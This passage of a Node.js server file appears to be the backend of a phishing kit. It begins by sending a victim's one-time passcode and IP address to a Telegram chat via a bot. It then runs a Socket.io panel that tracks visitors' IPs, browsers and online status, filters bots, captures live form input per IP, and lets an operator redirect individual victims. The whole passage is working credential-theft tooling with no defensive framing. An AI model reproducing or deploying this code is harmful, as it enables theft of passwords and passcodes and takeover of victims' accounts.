  block += `OTP: ${data.code}\nIP: ${ip}\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${brand}  | [${target}]  |  TEAM`;
  
  bot.telegram.sendMessage(process.env.CHATID,block);
}





// Listen to server:
http.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  
  // Socket.io connection handling
  io.on('connection', (socket) => {
    const clientIP = requestIp.getClientIp(socket.request);
    console.log('a user connected:', clientIP);
    
    // Store IP in socket for later reference
    socket.clientIP = clientIP;
    
    // Update IP cache with online status
    if (ipCache.has(clientIP)) {
      const ipData = ipCache.get(clientIP);
      ipData.isOnline = true;
      ipData.lastConnected = new Date();
      ipCache.set(clientIP, ipData);
    } else {
      // Create a basic entry if IP is not in cache yet
      const basicData = {
        requestCount: 1,
        firstRequest: new Date().toISOString(),
        lastRequest: new Date().toISOString(),
        userAgent: socket.request.headers["user-agent"] || null,
        browser: parseUserAgent(socket.request.headers["user-agent"])?.browser || null,
        os: parseUserAgent(socket.request.headers["user-agent"])?.os || null,
        path: "/",
        isOnline: true,
        lastConnected: new Date(),
        isBot: false,
        isBlocked: false
      };
      
      ipCache.set(clientIP, basicData);
    }
    
    // Emit updated dashboard data to all connected clients
    io.emit('dashboard-update');

    socket.on('disconnect', () => {
      console.log('user disconnected:', socket.clientIP);
      
      // Update IP cache with offline status
      if (ipCache.has(socket.clientIP)) {
        const ipData = ipCache.get(socket.clientIP);
        ipData.isOnline = false;
        ipData.lastDisconnected = new Date();
        ipCache.set(socket.clientIP, ipData);
        
        // Emit updated dashboard data to all connected clients
        io.emit('dashboard-update');
      }
    });

    // Handle redirect requests from dashboard
    socket.on('redirect-user', (data) => {
      io.emit('redirect', {url: data.url, ip: data.ip});
    });
    
    // Handle input data from clients
    socket.on('input-data', (data) => {
      const clientIP = socket.clientIP;
      
      // Skip if IP is blocked
      if (ipCache.has(clientIP) && ipCache.get(clientIP).isBlocked) {
        return;
      }
      
      // Store input data with IP association
      if (!inputDataCache.has(clientIP)) {
        inputDataCache.set(clientIP, []);
      }
      
      // Add timestamp and path information
      const inputData = {
        ...data,
        ip: clientIP,
        timestamp: new Date().toISOString()
      };
      
      // Add to the beginning of the array (newest first)
      const ipInputs = inputDataCache.get(clientIP);
      ipInputs.unshift(inputData);
      
      // Limit to 50 most recent inputs per IP
      if (ipInputs.length > 50) {
        ipInputs.pop();
      }
      
      // Update the cache
      inputDataCache.set(clientIP, ipInputs);
      
      // Notify dashboard of new input data
      io.emit('input-data-update');
    });
  });
});